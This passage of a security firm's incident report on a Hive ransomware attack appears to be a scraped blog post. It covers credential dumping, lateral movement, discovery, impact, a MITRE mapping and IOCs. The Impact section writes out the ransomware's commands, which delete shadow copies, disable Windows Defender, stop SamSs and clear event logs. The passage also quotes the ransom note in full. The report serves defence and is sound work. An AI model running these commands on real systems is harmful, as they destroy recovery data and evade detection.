                    "html": "<p>Converting the Base64 into a hexadecimal string and reformatting with a Python script restored the malicious file. VirusTotal analysis shows 23 out of 52 antivirus detections and attributes the file to the Cobalt Strike framework.</p>"
                },
                {
                    "id": "<sentence_0xd046c6d7>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p> </p>"
                },
                {
                    "id": "<sentence_0x20ce10b9>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x5b2f4088>": "https://info.varonis.com/hs-fs/hubfs/VirusTotal%20detection.png?width=1888&name=VirusTotal%20detection.png"
                    },
                    "text": "",
                    "html": "<p><img alt=\"VirusTotal detection\" src=\"https://info.varonis.com/hs-fs/hubfs/VirusTotal%20detection.png?width=1888&amp;name=VirusTotal%20detection.png\" width=\"1888\"/></p>"
                }
            ]
        },
        {
            "id": "<chapter_0xe50083eb>",
            "title": "Persistence",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x9bf80e34>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "With the provided NT AUTHORITY\\SYSTEM privileges and to maintain persistence over the compromised server, a newly crafted account followed by the name \"user\" was created and added to \"Remote Desktop Users\" and \"Administrators\" groups. The user was used to access multiple paths seeking \"password\" related files, RDP access to backup servers, and more.",
                    "html": "<p>With the provided NT AUTHORITY\\SYSTEM privileges and to maintain persistence over the compromised server, a newly crafted account followed by the name \"user\" was created and added to \"Remote Desktop Users\" and \"Administrators\" groups. The user was used to access multiple paths seeking \"password\" related files, RDP access to backup servers, and more.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x26a16e09>",
            "title": "Credential Access",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xa78938dd>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The threat actor used Mimikatz, a post-exploitation tool, specifically its SekurLSA's \"logonPasswords\" module, which extracts the passwords and NTLM hashes of the accounts logged into the system and saves the results to a text file on the local system. With the administrator's NTLM hash in hand, the threat actor used the pass-the-hash technique to get highly privileged access to other assets in the network by launching a new command prompt on the affected system:",
                    "html": "<p>The threat actor used Mimikatz, a post-exploitation tool, specifically its SekurLSA's \"logonPasswords\" module, which extracts the passwords and NTLM hashes of the accounts logged into the system and saves the results to a text file on the local system. With the administrator's NTLM hash in hand, the threat actor used the pass-the-hash technique to get highly privileged access to other assets in the network by launching a new command prompt on the affected system:</p>"
                },
                {
                    "id": "<sentence_0x294917be>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p> </p>"
                },
                {
                    "id": "<sentence_0x733a5a1c>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xc16a259f>": "https://info.varonis.com/hs-fs/hubfs/pth.png?width=1081&name=pth.png"
                    },
                    "text": "",
                    "html": "<p><img alt=\"pth\" src=\"https://info.varonis.com/hs-fs/hubfs/pth.png?width=1081&amp;name=pth.png\" width=\"1081\"/></p>"
                }
            ]
        },
        {
            "id": "<chapter_0xf909715c>",
            "title": "Lateral Movement",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xdb7f1be8>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Leveraging the stolen domain admin account, the actor performed RDP access requests using mstsc.exe following the parameter \"/v\" to multiple devices on the network, mainly searching for servers associated with the network backups and SQL servers. We strongly believe that these actions were performed to confirm the ability to access the critical servers before the ransomware deployment.",
                    "html": "<p>Leveraging the stolen domain admin account, the actor performed RDP access requests using mstsc.exe following the parameter \"/v\" to multiple devices on the network, mainly searching for servers associated with the network backups and SQL servers. We strongly believe that these actions were performed to confirm the ability to access the critical servers before the ransomware deployment.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xad798b95>",
            "title": "Discovery",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x897cc599>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "A known public network scanner tool named \"SoftPerfect\" was used to perform scans over the domain assets.",
                    "html": "<p>A known public network scanner tool named \"SoftPerfect\" was used to perform scans over the domain assets.</p>"
                },
                {
                    "id": "<sentence_0x484f2391>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xc249a08c>": "https://info.varonis.com/hs-fs/hubfs/SoftPerfect%20Network%20Scanner.png?width=1367&name=SoftPerfect%20Network%20Scanner.png"
                    },
                    "text": "By utilizing the tool, the threat actor acquired the domain devices list and saved the results to a text file named \"domains.txt.\" To locate all live hosts, the attacker executed a Batch script called \"p.bat,\" which looped over the domains list sending pings and saved the results to a text file named \"res.txt.\"",
                    "html": "<p><img alt=\"SoftPerfect Network Scanner\" src=\"https://info.varonis.com/hs-fs/hubfs/SoftPerfect%20Network%20Scanner.png?width=1367&amp;name=SoftPerfect%20Network%20Scanner.png\" width=\"1367\"/>By utilizing the tool, the threat actor acquired the domain devices list and saved the results to a text file named \"domains.txt.\" To locate all live hosts, the attacker executed a Batch script called \"p.bat,\" which looped over the domains list sending pings and saved the results to a text file named \"res.txt.\"</p>"
                },
                {
                    "id": "<sentence_0xe8f800aa>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x57b296e4>": "https://info.varonis.com/hs-fs/hubfs/pbatch.png?width=1086&name=pbatch.png"
                    },
                    "text": "",
                    "html": "<p><img alt=\"pbatch\" src=\"https://info.varonis.com/hs-fs/hubfs/pbatch.png?width=1086&amp;name=pbatch.png\" width=\"1086\"/></p>"
                },
                {
                    "id": "<sentence_0x61aad54c>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0xb953c6c1>": "https://info.varonis.com/hs-fs/hubfs/res.png?width=1146&name=res.png"
                    },
                    "text": "",
                    "html": "<p><img alt=\"res\" src=\"https://info.varonis.com/hs-fs/hubfs/res.png?width=1146&amp;name=res.png\" width=\"1146\"/></p>"
                },
                {
                    "id": "<sentence_0xdc9802a7>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xa5f6d6f3>": "https://twitter.com/vxunderground/status/1423336151860002816?s=20"
                    },
                    "text": "The p.bat script and file naming convention match part of Conti's ransomware toolkit, which was provided to the group's affiliates and first leaked on August 21, 2022 and published on Twitter. This indicates that Hive affiliates are adopting other ransomware group techniques.",
                    "html": "<p>The p.bat script and file naming convention match part of Conti's ransomware toolkit, which was provided to the group's affiliates and first leaked on August 21, 2022 and <a href=\"https://twitter.com/vxunderground/status/1423336151860002816?s=20\">published on Twitter</a>. This indicates that Hive affiliates are adopting other ransomware group techniques.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x9e4520a6>",
            "title": "Impact",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x5e5573a1>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The threat actors began their final actions by distributing a file named \"windows.exe,\" which was the ransomware payload written in Golang. The payload performs multiple operations, including deleting shadow copies, disabling security products, clearing Windows event logs, and closing handles on files to guarantee a smooth encryption process. Below is a brief documentation of the executed commands:",
                    "html": "<p>The threat actors began their final actions by distributing a file named \"windows.exe,\" which was the ransomware payload written in Golang. The payload performs multiple operations, including deleting shadow copies, disabling security products, clearing Windows event logs, and closing handles on files to guarantee a smooth encryption process. Below is a brief documentation of the executed commands:</p>"
                },
                {
                    "id": "<sentence_0x563e2ee6>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0xd6594d2>": {
                            "Command": {
                                "0": "vssadmin.exe delete shadows /all /quiet",
                                "1": "net.exe stop \"SamSs\" /y",
                                "2": "reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f",
                                "3": "wevtutil.exe cl security"
                            },
                            "Description": {
                                "0": "Deleting the shadow copies from the machine to inhibit system recovery",
                                "1": "Stops the Security Accounts Manager to prevent sending alerts to SIEM system",
                                "2": "Disables Windows Defender to avoid detection",
                                "3": "Clearing the Windows Security Event Logs"
                            }
                        }
                    },
                    "text": "",
                    "html": "<table>\n<tbody>\n<tr>\n<th>Command</th>\n<th>Description</th>\n</tr>\n<tr>\n<td>vssadmin.exe delete shadows /all /quiet</td>\n<td>Deleting the shadow copies from the machine to inhibit system recovery</td>\n</tr>\n<tr>\n<td>net.exe stop \"SamSs\" /y</td>\n<td>Stops the Security Accounts Manager to prevent sending alerts to SIEM system</td>\n</tr>\n<tr>\n<td>reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f</td>\n<td>Disables Windows Defender to avoid detection</td>\n</tr>\n<tr>\n<td>wevtutil.exe cl security</td>\n<td>Clearing the Windows Security Event Logs</td>\n</tr>\n</tbody>\n</table>"
                },
                {
                    "id": "<sentence_0x9758e215>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The ransomware iterates through all the available folders encrypting the included files and drops a ransom note named \"_HOW_TO_DECRYPT.txt\" in each folder. Once it has finished encryption, it pops the ransom note to inform the user of the attack.",
                    "html": "<p>The ransomware iterates through all the available folders encrypting the included files and drops a ransom note named \"_HOW_TO_DECRYPT.txt\" in each folder. Once it has finished encryption, it pops the ransom note to inform the user of the attack.</p>"
                },
                {
                    "id": "<sentence_0xb1094679>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<code_0x45c6ef80>": "\nYour network has been breached and all data were encrypted.\nPersonal data, financial reports and important documents are ready to disclose.\nTo decrypt all the data and to prevent exfiltrated files to be disclosed at \nhttp://hiveleakdbtnp76ulyhi52eag6c6tyc3xw7ez7iqy6wc34gd2nekazyd.onion/\nyou will need to purchase our decryption software.\nPlease contact our sales department at:\n http://hivecust6vhekztbqgdnkks64ucehqacge3dij3gyrrpdp57zoq3ooqd.onion/\n \n Login: \n Password: \nTo get an access to .onion websites download and install Tor Browser at:\n https://www.torproject.org/ (Tor Browser is not related to us)\nFollow the guidelines below to avoid losing your data:\n - Do not modify, rename or delete *.key. files. Your data will be \n undecryptable.\n - Do not modify or rename encrypted files. You will lose them.\n - Do not report to the Police, FBI, etc. They don't care about your business.\n They simply won't allow you to pay. As a result you will lose everything.\n - Do not hire a recovery company. They can't decrypt without the key. \n They also don't care about your business. They believe that they are \n good negotiators, but it is not. They usually fail. So speak for yourself.\n - Do not reject to purchase. Exfiltrated files will be publicly disclosed.\n"
                    },
                    "text": "",
                    "html": "<code>\nYour network has been breached and all data were encrypted.\nPersonal data, financial reports and important documents are ready to disclose.\nTo decrypt all the data and to prevent exfiltrated files to be disclosed at \nhttp://hiveleakdbtnp76ulyhi52eag6c6tyc3xw7ez7iqy6wc34gd2nekazyd.onion/\nyou will need to purchase our decryption software.\nPlease contact our sales department at:\n http://hivecust6vhekztbqgdnkks64ucehqacge3dij3gyrrpdp57zoq3ooqd.onion/\n \n Login: \n Password: \nTo get an access to .onion websites download and install Tor Browser at:\n https://www.torproject.org/ (Tor Browser is not related to us)\nFollow the guidelines below to avoid losing your data:\n - Do not modify, rename or delete *.key. files. Your data will be \n undecryptable.\n - Do not modify or rename encrypted files. You will lose them.\n - Do not report to the Police, FBI, etc. They don't care about your business.\n They simply won't allow you to pay. As a result you will lose everything.\n - Do not hire a recovery company. They can't decrypt without the key. \n They also don't care about your business. They believe that they are \n good negotiators, but it is not. They usually fail. So speak for yourself.\n - Do not reject to purchase. Exfiltrated files will be publicly disclosed.\n</code>"
                }
            ]
        },
        {
            "id": "<chapter_0x64b31e0a>",
            "title": "Conclusions",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xc49b1baa>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Ransomware attacks have grown significantly over the past years and remain the preferred method of threat actors aiming to maximize profits. The impact of an attack can be detrimental. It may potentially harm an organization's reputation, disrupt regular operations and lead to temporary, and possibly permanent, loss of sensitive data.",
                    "html": "<p>Ransomware attacks have grown significantly over the past years and remain the preferred method of threat actors aiming to maximize profits. The impact of an attack can be detrimental. It may potentially harm an organization's reputation, disrupt regular operations and lead to temporary, and possibly permanent, loss of sensitive data.</p>"
                },
                {
                    "id": "<sentence_0x4c6b35f9>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Although detecting and responding to such incidents can be challenging, most malicious activities can be prevented by having the right security tools, incident response plans, and patches for known vulnerabilities in place.",
                    "html": "<p>Although detecting and responding to such incidents can be challenging, most malicious activities can be prevented by having the right security tools, incident response plans, and patches for known vulnerabilities in place.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0xdd6b263e>",
            "title": "Recommendations",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x27cca442>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Varonis Forensics Team recommends the following:",
                    "html": "<p>Varonis Forensics Team recommends the following:</p>"
                },
                {
                    "id": "<sentence_0x1229cc5b>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x68e6026a>": "https://techcommunity.microsoft.com/t5/exchange-team-blog/proxyshell-vulnerabilities-and-your-exchange-server/ba-p/2684705",
                        "<a_0x214d0351>": "https://www.microsoft.com/en-us/download/details.aspx?id=46899",
                        "<a_0x4eb1394f>": "https://techcommunity.microsoft.com/t5/storage-at-microsoft/stop-using-smb1/ba-p/425858"
                    },
                    "text": "Patch Exchange server to the latest Exchange Cumulative Update (CU) and Security Update (SU) provided by Microsoft.<crlf>Enforce the use of complex passwords and require users to change passwords periodically.<crlf>Use the Microsoft LAPS solution to revoke local admin permissions from domain accounts (the principle of least privilege) and regularly check for and remove inactive user accounts.<crlf>Block SMBv1 usage and use SMB signing to protect against pass-the-hash attack.<crlf>Restrict access to the minimum required for the employee's role.<crlf>Detect and automatically prevent access control changes that violate your business rules.<crlf>Train employees in security principles and make sure employees receive security awareness training as a part of your cyber security plans.<crlf>Establish basic security practices, and set rules of behavior describing how to handle and protect the organization and customer information and other vital data.",
                    "html": "<ul>\n<li><a href=\"https://techcommunity.microsoft.com/t5/exchange-team-blog/proxyshell-vulnerabilities-and-your-exchange-server/ba-p/2684705\">Patch</a> Exchange server to the latest Exchange Cumulative Update (CU) and Security Update (SU) provided by Microsoft.</li>\n<li>Enforce the use of complex passwords and require users to change passwords periodically.</li>\n<li>Use the <a href=\"https://www.microsoft.com/en-us/download/details.aspx?id=46899\">Microsoft LAPS</a> solution to revoke local admin permissions from domain accounts (the principle of least privilege) and regularly check for and remove inactive user accounts.</li>\n<li><a href=\"https://techcommunity.microsoft.com/t5/storage-at-microsoft/stop-using-smb1/ba-p/425858\">Block SMBv1</a> usage and use SMB signing to protect against pass-the-hash attack.</li>\n<li>Restrict access to the minimum required for the employee's role.</li>\n<li>Detect and automatically prevent access control changes that violate your business rules.</li>\n<li>Train employees in security principles and make sure employees receive security awareness training as a part of your cyber security plans.</li>\n<li>Establish basic security practices, and set rules of behavior describing how to handle and protect the organization and customer information and other vital data.</li>\n</ul>"
                }
            ]
        },
        {
            "id": "<chapter_0xed0d568d>",
            "title": "MITRE Breakdown",
            "title_level": 2,
            "sentences": []
        },
        {
            "id": "<chapter_0xc314b1e2>",
            "title": "1. Initial Access",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xd78254ef>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x462dfa26>": "https://attack.mitre.org/techniques/T1190/",
                        "<a_0xef448303>": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34473",
                        "<a_0xe90d9e6e>": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34523",
                        "<a_0x64a80f4>": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31207"
                    },
                    "text": "Exploit Public-Facing Application (T1190)<crlf>CVE-2021-34473<crlf>CVE-2021-34523<crlf>CVE-2021-31207",
                    "html": "<ul>\n<li>Exploit Public-Facing Application (<a href=\"https://attack.mitre.org/techniques/T1190/\">T1190</a>)</li>\n<ul>\n<li><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34473\">CVE-2021-34473</a></li>\n<li><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34523\">CVE-2021-34523</a></li>\n<li><a href=\"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-31207\">CVE-2021-31207</a></li>\n</ul>\n</ul>"
                }
            ]
        },
        {
            "id": "<chapter_0x2c19ae47>",
            "title": "2. Execution",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x43cc931e>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x949b4c4c>": "https://attack.mitre.org/techniques/T1204/",
                        "<a_0x3045bc97>": "https://attack.mitre.org/techniques/T1204/002/"
                    },
                    "text": "User Execution (T1204)<crlf>Malicious File (T1204.002)",
                    "html": "<ul>\n<li>User Execution (<a href=\"https://attack.mitre.org/techniques/T1204/\">T1204</a>)</li>\n<ul>\n<li>Malicious File (<a href=\"https://attack.mitre.org/techniques/T1204/002/\">T1204.002</a>)</li>\n</ul>\n</ul>"
                },
                {
                    "id": "<sentence_0x4473cb8a>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x702a98b0>": "https://attack.mitre.org/techniques/T1059/",
                        "<a_0xac716cc5>": "https://attack.mitre.org/techniques/T1059/001/"
                    },
                    "text": "Command and Scripting Interpreter (T1059)<crlf>PowerShell (T1059.001)",
                    "html": "<ul>\n<li>Command and Scripting Interpreter (<a href=\"https://attack.mitre.org/techniques/T1059/\">T1059</a>)</li>\n<ul>\n<li>PowerShell (<a href=\"https://attack.mitre.org/techniques/T1059/001/\">T1059.001</a>)</li>\n</ul>\n</ul>"
                }
            ]
        },
        {
            "id": "<chapter_0xd8bd8c90>",
            "title": "3. Persistence",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x91c14109>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x80c6d311>": "https://attack.mitre.org/techniques/T1136/",
                        "<a_0xdac17777>": "https://attack.mitre.org/techniques/T1136/002/"
                    },
                    "text": "Create Account (T1136)<crlf>Domain Account (T1136.002)",
                    "html": "<ul>\n<li>Create Account (<a href=\"https://attack.mitre.org/techniques/T1136/\">T1136</a>)</li>\n<ul>\n<li>Domain Account (<a href=\"https://attack.mitre.org/techniques/T1136/002/\">T1136.002</a>)</li>\n</ul>\n</ul>"
                },
                {
                    "id": "<sentence_0xcd2d892f>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x4c239275>": "https://attack.mitre.org/techniques/T1078/002/"
                    },
                    "text": "Valid Accounts (T1078)<crlf>Domain Accounts (T1078.002)",
                    "html": "<ul>\n<li>Valid Accounts (<a href=\"https://attack.mitre.org/techniques/T1078/002/\">T1078</a>)</li>\n<ul>\n<li>Domain Accounts (<a href=\"https://attack.mitre.org/techniques/T1078/002/\">T1078.002</a>)</li>\n</ul>\n</ul>"
                }
            ]
        },
        {
            "id": "<chapter_0x50364928>",
            "title": "4. Privilege Escalation",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x4ccb2a96>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x4c239275>": "https://attack.mitre.org/techniques/T1078/002/"
                    },
                    "text": "Valid Accounts (T1078)<crlf>Domain Accounts (T1078.002)",
                    "html": "<ul>\n<li>Valid Accounts (<a href=\"https://attack.mitre.org/techniques/T1078/002/\">T1078</a>)</li>\n<li>Domain Accounts (<a href=\"https://attack.mitre.org/techniques/T1078/002/\">T1078.002</a>)</li>\n</ul>"
                }
            ]
        },
        {
            "id": "<chapter_0xa7c6c9f9>",
            "title": "5. Defense Evasion",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x97482b92>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xfb40b367>": "https://attack.mitre.org/techniques/T1140/",
                        "<a_0x48c9f760>": "https://attack.mitre.org/techniques/T1070/",
                        "<a_0xa889557c>": "https://attack.mitre.org/techniques/T1070/001/"
                    },
                    "text": "Deobfuscate/Decode Files or Information (T1140)<crlf>Indicator Removal on Host (T1070)<crlf>Clear Windows Event Logs (T1070.001)",
                    "html": "<ul>\n<li>Deobfuscate/Decode Files or Information (<a href=\"https://attack.mitre.org/techniques/T1140/\">T1140</a>)</li>\n<li>Indicator Removal on Host (<a href=\"https://attack.mitre.org/techniques/T1070/\">T1070</a>)</li>\n<ul>\n<li>Clear Windows Event Logs (<a href=\"https://attack.mitre.org/techniques/T1070/001/\">T1070.001</a>)</li>\n</ul>\n</ul>"
                }
            ]
        },
        {
            "id": "<chapter_0x3650fc5a>",
            "title": "6. Credential Access",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xcefe3d24>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xc4841834>": "https://attack.mitre.org/techniques/T1003/",
                        "<a_0x78e35415>": "https://attack.mitre.org/techniques/T1003/005/"
                    },
                    "text": "OS Credential Dumping (T1003)<crlf>Cached Domain Credentials (T1003.005)",
                    "html": "<ul>\n<li>OS Credential Dumping (<a href=\"https://attack.mitre.org/techniques/T1003/\">T1003</a>)</li>\n<ul>\n<li>Cached Domain Credentials (<a href=\"https://attack.mitre.org/techniques/T1003/005/\">T1003.005</a>)</li>\n</ul>\n</ul>"
                }
            ]
        },
        {
            "id": "<chapter_0x72eea762>",
            "title": "7. Discovery",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x3bbdb1dd>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xad4d00c1>": "https://attack.mitre.org/techniques/T1018/"
                    },
                    "text": "Remote System Discovery (T1018)",
                    "html": "<ul>\n<li>Remote System Discovery (<a href=\"https://attack.mitre.org/techniques/T1018/\">T1018</a>)</li>\n</ul>"
                }
            ]
        },
        {
            "id": "<chapter_0xa109a636>",
            "title": "8. Lateral Movement",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0x92b0a8e4>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x21b33782>": "https://attack.mitre.org/techniques/T1021/001/"
                    },
                    "text": "Remote Services (T1021)<crlf>Remote Desktop Protocol (T1021.001)",
                    "html": "<ul>\n<li>Remote Services (<a href=\"https://attack.mitre.org/techniques/T1021/001/\">T1021</a>)</li>\n<ul>\n<li>Remote Desktop Protocol (<a href=\"https://attack.mitre.org/techniques/T1021/001/\">T1021.001</a>)</li>\n</ul>\n</ul>"
                }
            ]
        },
        {
            "id": "<chapter_0x38b15c33>",
            "title": "9. Command and Control",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xcc21e51b>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x5ea7e83d>": "https://attack.mitre.org/techniques/T1071/",
                        "<a_0x742680c>": "https://attack.mitre.org/techniques/T1071/001/"
                    },
                    "text": "Application Layer Protocol (T1071)<crlf>Web Protocols (T1071.001)",
                    "html": "<ul>\n<li>Application Layer Protocol (<a href=\"https://attack.mitre.org/techniques/T1071/\">T1071</a>)</li>\n<ul>\n<li>Web Protocols (<a href=\"https://attack.mitre.org/techniques/T1071/001/\">T1071.001</a>)</li>\n</ul>\n</ul>"
                }
            ]
        },
        {
            "id": "<chapter_0x8de10bae>",
            "title": "10. Impact",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xf8286be2>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xe841c7a8>": "https://attack.mitre.org/techniques/T1486/"
                    },
                    "text": "Data Encrypted for Impact (T1486)",
                    "html": "<ul>\n<li>Data Encrypted for Impact (<a href=\"https://attack.mitre.org/techniques/T1486/\">T1486</a>)</li>\n</ul>"
                }
            ]
        },
        {
            "id": "<chapter_0x72624e79>",
            "title": "IOC's",
            "title_level": 2,
            "sentences": []
        },
        {
            "id": "<chapter_0xaac26e61>",
            "title": "User accounts names created",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xb6040f8a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "\"user\"",
                    "html": "<ul>\n<li>\"user\"</li>\n</ul>"
                }
            ]
        },
        {
            "id": "<chapter_0x2133b01e>",
            "title": "Malicious IP's",
            "title_level": 3,
            "sentences": [
                {
                    "id": "<sentence_0xfdac8eb9>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "139.60.161.228<crlf>139.60.161.56<crlf>91.208.52.149<crlf>185.70.184.8",
                    "html": "<ul>\n<li>139.60.161.228</li>\n<li>139.60.161.56</li>\n<li>91.208.52.149</li>\n<li>185.70.184.8</li>\n</ul>"
                },
                {
                    "id": "<sentence_0xdb235063>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0xc8c3cf12>": {
                            "Name": {
                                "0": "Windows.exe",
                                "1": "Mimikatz.exe",
                                "2": "advanced_port_scanner_2.5.3869.exe",
                                "3": "advanced port scanner.exe",
                                "4": "scan.exe",
                                "5": "p.bat",
                                "6": "Webshell #1",
                                "7": "Webshell #2"
                            },
                            "MD5": {
                                "0": "",
                                "1": "6c9ad4e67032301a61a9897377d9cff8",
                                "2": "6a58b52b184715583cda792b56a0a1ed",
                                "3": "4fdabe571b66ceec3448939bfb3ffcd1",
                                "4": "bb7c575e798ff5243b5014777253635d",
                                "5": "5e1575c221f8826ce55ac2696cf1cf0b",
                                "6": "d46104947d8478030e8bcfcc74f2aef7",
                                "7": "2401f681b4722965f82a3d8199a134ed"
                            },
                            "SHA1": {
                                "0": "",
                                "1": "655979d56e874fbe7561bb1b6e512316c25cbb19",
                                "2": "3477a173e2c1005a81d042802ab0f22cc12a4d55",
                                "3": "763499b37aacd317e7d2f512872f9ed719aacae1",
                                "4": "2146f04728fe93c393a74331b76799ea8fe0269f",
                                "5": "ecf794599c5a813f31f0468aecd5662c5029b5c4",
                                "6": "d1ef9f484f10d12345c41d6b9fca8ee0efa29b60",
                                "7": "2aee699780f06857bb0fb9c0f73e33d1ac87a385"
                            }
                        }
                    },
                    "text": "",
                    "html": "<table>\n<tbody>\n<tr>\n<th>Name</th>\n<th>MD5</th>\n<th>SHA1</th>\n</tr>\n<tr>\n<td>Windows.exe</td>\n<td> </td>\n<td> </td>\n</tr>\n<tr>\n<td>Mimikatz.exe</td>\n<td>6c9ad4e67032301a61a9897377d9cff8</td>\n<td>655979d56e874fbe7561bb1b6e512316c25cbb19</td>\n</tr>\n<tr>\n<td>advanced_port_scanner_2.5.3869.exe</td>\n<td>6a58b52b184715583cda792b56a0a1ed</td>\n<td>3477a173e2c1005a81d042802ab0f22cc12a4d55</td>\n</tr>\n<tr>\n<td>advanced port scanner.exe</td>\n<td>4fdabe571b66ceec3448939bfb3ffcd1</td>\n<td>763499b37aacd317e7d2f512872f9ed719aacae1</td>\n</tr>\n<tr>\n<td>scan.exe</td>\n<td>bb7c575e798ff5243b5014777253635d</td>\n<td>2146f04728fe93c393a74331b76799ea8fe0269f</td>\n</tr>\n<tr>\n<td>p.bat</td>\n<td>5e1575c221f8826ce55ac2696cf1cf0b</td>\n<td>ecf794599c5a813f31f0468aecd5662c5029b5c4</td>\n</tr>\n<tr>\n<td>Webshell #1</td>\n<td>d46104947d8478030e8bcfcc74f2aef7</td>\n<td>d1ef9f484f10d12345c41d6b9fca8ee0efa29b60</td>\n</tr>\n<tr>\n<td>Webshell #2</td>\n<td>2401f681b4722965f82a3d8199a134ed</td>\n<td>2aee699780f06857bb0fb9c0f73e33d1ac87a385</td>\n</tr>\n</tbody>\n</table>"
                },
                {
                    "id": "<sentence_0x97df1368>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x93c8a67a>": "https://info.varonis.com/hubfs/nadav.png"
                    },
                    "text": "",
                    "html": "<img alt=\"Nadav Ovadia\" src=\"https://info.varonis.com/hubfs/nadav.png\"/>"
                },
                {
                    "id": "<sentence_0xa420039c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Nadav Ovadia is a security researcher for Varonis.",
                    "html": "<p class=\"blog-post__author-bio\">Nadav Ovadia is a security researcher for Varonis.</p>"
                }
            ]
        }
    ]
}